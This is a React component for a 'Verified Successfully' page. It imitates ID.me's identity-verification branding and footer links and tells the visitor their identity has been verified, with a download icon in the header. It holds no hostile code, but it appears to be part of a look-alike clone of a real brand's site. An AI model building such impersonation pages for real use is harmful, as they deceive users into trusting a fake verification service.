import React from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import { FiCheckCircle } from "react-icons/fi";

const Successful = () => {
  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      {/* Header */}
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      {/* Success message */}
      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
        <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
          VERIFIED SUCCESSFULLY
        </h1>
        <FiCheckCircle className="text-[#02579b]" size={60} />
        <h1 className="text-[#02579b] text-[15px] font-semibold mt-2">
          Your Identity has been verified successfully
        </h1>
      </div>

      {/* Footer */}
      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-3" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-3" />
          <span>Privacy Policy</span>
        </div>
      </footer>
    </div>
  );
};

export default Successful;
